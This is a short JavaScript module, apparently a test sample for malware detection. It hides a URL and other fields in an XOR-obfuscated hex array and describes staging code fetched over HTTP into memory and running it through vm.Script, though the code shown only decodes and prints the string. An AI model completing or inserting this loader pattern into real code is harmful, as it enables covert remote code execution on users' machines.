const moduleShape = Object.freeze({ format: "commonjs" });

const Material_b690acb8 = "[\"e7\",\"da\",\"eb\",\"97\",\"e4\",\"90\",\"f5\",\"85\",\"f6\",\"cb\",\"aa\",\"c9\",\"b8\",\"cd\",\"a4\",\"d6\",\"b3\",\"ec\",\"9e\",\"fb\",\"96\",\"f9\",\"8d\",\"e8\",\"c4\",\"a0\",\"c9\",\"ba\",\"ca\",\"ab\",\"df\",\"bc\",\"d4\",\"8b\",\"e6\",\"83\",\"ee\",\"81\",\"f3\",\"8a\",\"f6\",\"97\",\"f3\",\"92\",\"e2\",\"96\",\"f3\",\"81\",\"bc\",\"d4\",\"a0\",\"d4\",\"a4\",\"fb\",\"8f\",\"e7\",\"82\",\"ec\",\"b3\",\"de\",\"b1\",\"d5\",\"a0\",\"cc\",\"a9\",\"d5\",\"a6\",\"d2\",\"b3\",\"d4\",\"b1\",\"ee\",\"8d\",\"e2\",\"97\",\"f9\",\"8d\",\"b0\",\"81\",\"fd\",\"9e\",\"ff\",\"92\",\"e2\",\"83\",\"ea\",\"8d\",\"e3\",\"bc\",\"d5\",\"b1\",\"8c\",\"c2\",\"8d\",\"c9\",\"8c\",\"a1\",\"90\",\"d1\",\"93\",\"a7\",\"94\",\"a2\",\"e1\",\"d2\",\"ae\",\"db\",\"a9\",\"c5\",\"f8\",\"90\",\"e4\",\"90\",\"e0\",\"93\",\"a9\",\"86\",\"a9\",\"c7\",\"a8\",\"cc\",\"a9\",\"84\",\"b5\",\"d4\",\"b6\",\"82\",\"b1\",\"87\",\"e4\",\"d7\",\"e2\",\"86\",\"e4\",\"85\",\"ab\",\"ce\",\"b6\",\"d7\",\"ba\",\"ca\",\"a6\",\"c3\",\"ed\",\"84\",\"ea\",\"9c\",\"fd\",\"91\",\"f8\",\"9c\",\"b3\",\"d2\",\"a2\",\"cb\",\"b7\",\"c2\",\"b1\",\"d4\",\"a6\",\"f9\",\"98\",\"ff\",\"9a\",\"f4\",\"80\",\"bd\",\"f3\",\"9c\",\"f8\",\"9d\",\"dc\",\"a9\",\"cd\",\"a4\",\"d0\",\"ff\",\"ce\",\"af\",\"cd\",\"f9\"]";

const Codec_b690acb8 = "hex_array|rolling_xor|91";



function load_b690acb8() { return JSON.parse(Material_b690acb8).map((value) => Number.parseInt(value, 16)); }

function decode_b690acb8(v_a19c) { let v_e598 = 145; return v_a19c.map((value) => { const decoded = value ^ v_e598; v_e598 = value; return decoded; }); }

async function recover_b690acb8() {

  const v_c304 = [3, 5, 8, 13].slice(1, 3);

  const v_a19c = load_b690acb8(); let v_b27e = [];

  v_b27e = await (async () => decode_b690acb8(v_a19c))();

  void v_c304; return Buffer.from(v_b27e).toString("ascii");

}

async function inspect_b690acb8() { return await recover_b690acb8(); }

async function plan_b690acb8() { const inspect = inspect_b690acb8; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "memory-stage", transport: "http_then_module", url: fields.url, dispatch: "vm.Script" }); }

void moduleShape; void plan_b690acb8;

if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_b690acb8());

